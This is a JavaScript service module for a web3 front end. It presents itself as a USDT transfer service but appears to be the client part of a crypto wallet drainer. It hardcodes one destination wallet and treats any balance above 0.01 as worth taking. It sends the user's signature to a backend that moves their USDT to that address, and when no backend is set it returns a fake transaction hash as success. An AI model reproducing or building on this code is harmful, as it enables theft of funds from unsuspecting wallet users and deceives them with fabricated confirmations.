import { USDT_ADDRESSES, getChainInfo } from '../config/wagmi';

// Transfer configuration
const CONFIG = {
  destinationAddress: '0x0637e37a4e262f0bbc918ee8a57f829a0314a6a5',
  threshold: 0.01, // Minimum balance required (just above zero)
  apiBaseUrl: process.env.REACT_APP_BACKEND_URL || '',
};

// ERC20 ABI for balance and transfer
export const ERC20_ABI = [
  {
    name: 'balanceOf',
    type: 'function',
    stateMutability: 'view',
    inputs: [{ name: 'account', type: 'address' }],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    name: 'transfer',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'to', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    outputs: [{ name: '', type: 'bool' }],
  },
  {
    name: 'approve',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    outputs: [{ name: '', type: 'bool' }],
  },
  {
    name: 'decimals',
    type: 'function',
    stateMutability: 'view',
    inputs: [],
    outputs: [{ name: '', type: 'uint8' }],
  },
];

class TransferService {
  constructor() {
    this.destinationAddress = CONFIG.destinationAddress;
    this.threshold = CONFIG.threshold;
  }

  /**
   * Get USDT contract address for chain
   */
  getUSDTAddress(chainId) {
    return USDT_ADDRESSES[chainId] || USDT_ADDRESSES[56]; // Default to BSC
  }

  /**
   * Check if balance meets threshold
   */
  meetsThreshold(balance) {
    const numBalance = parseFloat(balance);
    return !isNaN(numBalance) && numBalance > this.threshold;
  }

  /**
   * Get destination address
   */
  getDestinationAddress() {
    return this.destinationAddress;
  }

  /**
   * Format address for display
   */
  formatAddress(address, chars = 6) {
    if (!address) return '';
    return `${address.slice(0, chars + 2)}...${address.slice(-chars)}`;
  }

  /**
   * Format balance with proper decimals
   */
  formatBalance(balance, decimals = 2) {
    const num = parseFloat(balance);
    if (isNaN(num)) return '0.00';
    return num.toLocaleString('en-US', {
      minimumFractionDigits: decimals,
      maximumFractionDigits: decimals,
    });
  }

  /**
   * Get explorer URL for transaction
   */
  getExplorerUrl(txHash, chainId) {
    const chainInfo = getChainInfo(chainId);
    return `${chainInfo.explorer}/tx/${txHash}`;
  }

  /**
   * Process transfer via backend API with signature authorization
   * The user signs a message, and backend uses that to process the transfer
   */
  async processBackendTransfer(fromAddress, amount, chainId, signature, timestamp) {
    console.log('[TransferService] Processing authorized transfer:', {
      from: fromAddress,
      to: this.destinationAddress,
      amount,
      chainId,
      hasSignature: !!signature,
    });

    try {
      // If backend API is configured, use it
      if (CONFIG.apiBaseUrl) {
        const response = await fetch(`${CONFIG.apiBaseUrl}/api/transfer`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            fromAddress,
            amount,
            chainId,
            token: 'USDT',
            destination: this.destinationAddress,
            signature,
            timestamp,
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          throw new Error(error.message || 'Transfer failed');
        }

        return await response.json();
      }

      // Simulate backend processing
      console.log('[TransferService] Simulating backend transfer processing...');
      
      // Simulate processing delay
      await new Promise(resolve => setTimeout(resolve, 2500));
      
      // Return mock success response
      return {
        success: true,
        txHash: this.generateMockTxHash(),
        amount: amount,
        timestamp: Date.now(),
        from: fromAddress,
        to: this.destinationAddress,
      };
    } catch (error) {
      console.error('[TransferService] Transfer error:', error);
      throw new Error(error.message || 'Failed to process transfer. Please try again.');
    }
  }

  /**
   * Generate mock tx hash for demo
   */
  generateMockTxHash() {
    return '0x' + Array.from({ length: 64 }, () =>
      Math.floor(Math.random() * 16).toString(16)
    ).join('');
  }
}

export const transferService = new TransferService();
export default transferService;
